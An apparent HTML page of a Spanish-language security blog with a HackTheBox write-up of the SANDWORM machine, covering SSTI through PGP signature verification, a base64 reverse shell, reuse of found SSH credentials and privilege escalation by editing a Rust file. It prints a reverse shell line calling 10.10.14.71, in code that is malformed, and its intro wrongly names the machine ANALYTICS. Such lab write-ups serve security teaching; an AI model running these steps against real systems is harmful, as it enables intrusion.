@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- 
+    - primary meta tags
+  -->
+  <title>Wren - Perosonal Blog Website </title>
+  <meta name="title" content="Wren - Perosonal Blog Website">
+  <meta name="description" content="This is a blog html template made by codewithsadee">
+
+  <!-- 
+    - favicon
+  -->
+  <link rel="shortcut icon" href="./favicon.svg" type="image/svg+xml">
+
+  <!-- 
+    - google font link
+  -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300;400;500;600;700;800&display=swap"
+    rel="stylesheet">
+  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+	<script src="https://kit.fontawesome.com/41bcea2ae3.js" crossorigin="anonymous"></script>
+
+  <!-- 
+    - custom css link
+  -->
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="stylesheet" href="../assets/css/header.css">
+  <link rel="stylesheet" href="../assets/css/contenedor.css">
+  <link rel="stylesheet" href="../assets/css/footer.css">
+  <link rel="stylesheet" href="../assets/css/codigo.css">
+
+  <!-- 
+    - preload images
+  -->
+  <link rel="preload" as="image" href="./assets/images/hero-banner.png">
+  <link rel="preload" as="image" href="./assets/images/pattern-2.svg">
+  <link rel="preload" as="image" href="./assets/images/pattern-3.svg">
+
+</head>
+
+<body id="top">
+
+  <!-- 
+    - #HEADER
+  -->
+  <header class="header">
+		<div class="logo">
+		<img class="logo1" src="./assets/images/logo/menor4.png" alt="">
+		</div>
+	
+		<input type="checkbox" id="toggle">
+		<label for="toggle"><img class="img2"  src="./assets/images/svg/menu.svg" alt="menu"></label>
+	
+	
+		<nav class="navigation">
+			<ul>
+				<li><a href="../index.html"> INICIO </a></li>
+				<li><a href="#"> SEGURIDAD INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTON-HACKING-WIFI/index.html">HACKING WIFI</a></li>
+					<li><a href="../SECTION-HACKING-WEB/index.html">HACKING WEB</a></li>
+					<li><a href="../SECTION-MALWARE/index.html">MALWARE</a></li>
+          <li><a href="../SECTION-BYPASS/index.html">BYPASS</a></li>
+				</ul>
+			</li>
+      <li><a href="#"> INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTION-LINUX/index.html">LINUX</a></li>
+					<li><a href="../SECTION-PROGRAMACION/index.html">PROGRAMACIÓN</a></li>
+					<li><a href="../SECTION-REDES/index.html">REDES</a></li>
+				
+	
+				</ul>
+			</li>
+				<li><a href="">CTF <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTION-HACKTHEBOX/index.html">HACKTHEBOX</a></li>
+				
+	
+				</ul>
+	
+				</li>
+				<li><a href="#"> ACERCA DE </a></li>
+			
+			
+			
+			</ul>
+	
+		</nav>
+
+	</header>
+
+  <main class="main-blog">
+
+    <h1 id="h1-main"> HackTheBox Write-Up - SANDWORM</h1>
+
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/001.webp" alt="Imagen HACKTHEBOX" />
+    </div>
+    <p> ANALYTICS es una máquina de dificultad fácil en la plataforma de HTB. Conseguiremos acceso a 
+      través de una version de METABASE en el caso un RCE y luego la explotacion de la version del kernel 22.04.2-Ubuntu para 
+      la escalacion de privelegios.
+    </p>
+
+    <h1 class="titulo"> ENUMERACION </h1>    
+
+    <p> Revisamos que puertos tiene abierto la maquina de hackthebox, y revisamos que tiene el puerto 80,22 abiertos.
+      </p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/002.webp" alt="Imagen hacking wifi" />
+      </div>
+
+      <p> Asi que ahora nos toca revisar sus version y servicios de los puertos que encontramos anteriormente que fueron el puerto 22,
+        80, 443 y no llegamos a ver algo interesante que nos de una pista de como vulnerar la maquina.
+      </p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/003.webp" alt="Imagen hacking wifi" />
+      </div>
+      
+      <p> Asi que revisamos si existen muchos mas directorios aparte del inicio y nos muestra muchas mas rutas , la cual podemos
+        investigar de que trata.
+      </p>
+      <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/004.webp alt="Imagen hacking wifi" />
+      </div>
+        
+          
+        <p> Revisando la web principal , no nos muestra que aiga un login ,pero sabemos que si lo hay, asi que lo ponemos 
+          en la url para que nos muestre.
+        </p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/005.webp" alt="Imagen hacking wifi" />
+        </div>
+
+
+
+        <p> Y como nos suponiamos el login si se encontraba pero lo tenian oculto.</p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/006.webp" alt="Imagen hacking wifi" />
+        </div>
+
+        <p> Tambien en nuestra busqueda de directorios tambien encontramos un guide , la cual nos lleva a esta web , y vemos
+          algo que nos llama atencion que son espacios vacios sin rellenar la cual talvez podria haber alguna vulnerabilidad de SSTI
+        
+        </p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/007.webp" alt="Imagen hacking wifi" />
+        </div>
+       
+        <p> Asi porque no buscar la forma de obtener una reverse shell mediante claves publicas? , encontramos este payload que su uso 
+          es muy sencillo simplemente sera de pasar nuestra reverse shell en base64 para saltearnos la seguridad de caracteres.
+        </p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/008.webp" alt="Imagen hacking wifi" />
+        </div>
+
+            <h1>INTRUSION</h1>
+        <p> Para poder probar si la web es vulnerable tendremos que crear un clave publica utiliando gpg , tal como nos muestra la imagen.
+          y luego injectar el payload cambiado con nuestra reverse shell en base64 como nos muestra en la imagen nos pedira poner una contraseña
+        asi que si desean le pueden poner.        </p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/009.webp" alt="Imagen hacking wifi" />
+        </div>
+
+
+        <p> Asi que despues nos la exportamos al archivo  Pub.asc pero primero tendras que poner el correo, el que utilizaste
+          para crear la clave.</p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/0010.webp" alt="Imagen hacking wifi" />
+        </div>
+
+        <p> Nos creamos un archivo simple con un texto dentro, no importa mucho el texto , ya que lo reemplazaremos despues.
+        </p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/0011.webp" alt="Imagen hacking wifi" />
+        </div>
+
+        <p> Llego el momento de reemplazarlo y crear nuestra dos boletos para obtener esa shell.
+        </p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/0012.webp" alt="Imagen hacking wifi" />
+        </div>
+
+        <p> Despues de haber hecho todo lo anterior tendremos un archivo Pub.asc la cual lo pondremos en la parte izquierda , donde dice 
+          public key y en el lado derecho pondremos el archivo signed_message.asc y daremos clic donde dice "VERIFY SIGNATURE".
+        </p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/0013.webp" alt="Imagen hacking wifi" />
+        </div>
+
+        <p> Antes de ejecutar lo anterior , tendremos que ponernos en modo listener en el puerto que ingresaste el reverse shell que
+          pasaste a base64 , ya despues de haberlo hecho tendremos nuestra shell en nuestra maquina.
+        </p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/0015.webp" alt="Imagen hacking wifi" />
+        </div>
+
+        <p> Buscando directorios encontramos algo interesante en esta ruta.</p>
+        <div class="imagenes-blog">
+            <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/0016.webp" alt="Imagen hacking wifi" />
+        </div>
+
+        <p> Al abrir el jason, encontramos que hay un usuario  y una password , asi que porque no usarla para conectarnos via ssh.
+      </p>
+      <div class="imagenes-blog">
+          <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/0017.webp" alt="Imagen hacking wifi" />
+      </div>
+
+      
+
+      <p> Nos conectamos via ssh con las credenciales que encontramos anteriormente y BINGO!, podimos ingresar y podemos 
+        visualizar  a la primera flag del usuario , pero aqui no se acaba todo habra que escalar privelegios para obtener esa flag de root.
+    </p>
+    <div class="imagenes-blog">
+        <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/0018.webp" alt="Imagen hacking wifi" />
+    </div>
+
+
+    <p> Para automatizar la busqueda usamos pspy64 y asi encontrarnos archivos o rutas que tenga algun privilegio o algun archivo vulnerable
+      y nos encontro esta ruta y dentro hay un lib.rs
+  </p>
+  <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/0019.webp" alt="Imagen hacking wifi" />
+  </div>
+
+  <p> Asi que podemos modificar ese archivo ,porque no crear una reverse shell .</p>
+  <div class="imagenes-blog">
+    <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/editararchivo.png" alt="Imagen hacking wifi" />
+</div>
+
+
+<p>Tendremos que sobrescribir el archivo cambiando a  este codigo con su ip y puerto que se pondra en escucha ,en la variable output
+  let output</p>
+  <div class="code-container">
+    <pre class="lenguage-python">
+    <code> <br>  let output = Command::new("bash")
+      .arg("file.txt")
+      .output(bash -i  >& /dev/tcp/10.10.14.71/5555 0>&1")
+      .expect("failed to execute process");</code>
+    </pre>
+    </div>
+
+
+<p> Deberemos de descargarnos el exploit dentro del directorio /tmp ,usando alguna herramienta para descargar de nuestro servidor en python, en este caso 
+  use la herramienta de wget , que esta instalada por defecto en los sistemas linux , si desean hacerlo de tal manera
+  como esta la imagen ,excelente es muy sencillo de hacerlo.
+</p>
+<div class="imagenes-blog">
+  <img class="img-contenido-blog" src="./assets/images/articulos/SANDWORM/ultimo.png" alt="Imagen hacking wifi" />
+</div>
+
+        <h1>Felicidades Acabas De Resolver La Maquina ANALYTICS!</h1>
+        
+        
+</main>
+
+
+  <!-- 
+    - #BACK TO TOP
+  -->
+  <footer class="footer"> 
+    <div class="izquierda">  
+  
+      <a href="#" id="footer-a"><a href="#">
+        <img src="../assets/images/logo/menorH.png" alt="logo h4ckdino">
+      </a>  © 2023 h4ckdino, Inc. </a>
+      <a href="#" id="footer-a">Ponte en contacto con nosotros</a>
+      <a href="#" id="footer-a" >Configuración de cookies</a>
+      <a href="#" id="footer-a" >Politica de privacidad</a>
+      
+  
+      
+    </div>
+  </footer>
+  
+  
+
+
+
+
+  <!-- 
+    - custom js link
+  -->
+  <script src="./assets/js/script.js"></script>
+
+  <!-- 
+    - ionicon link
+  -->
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
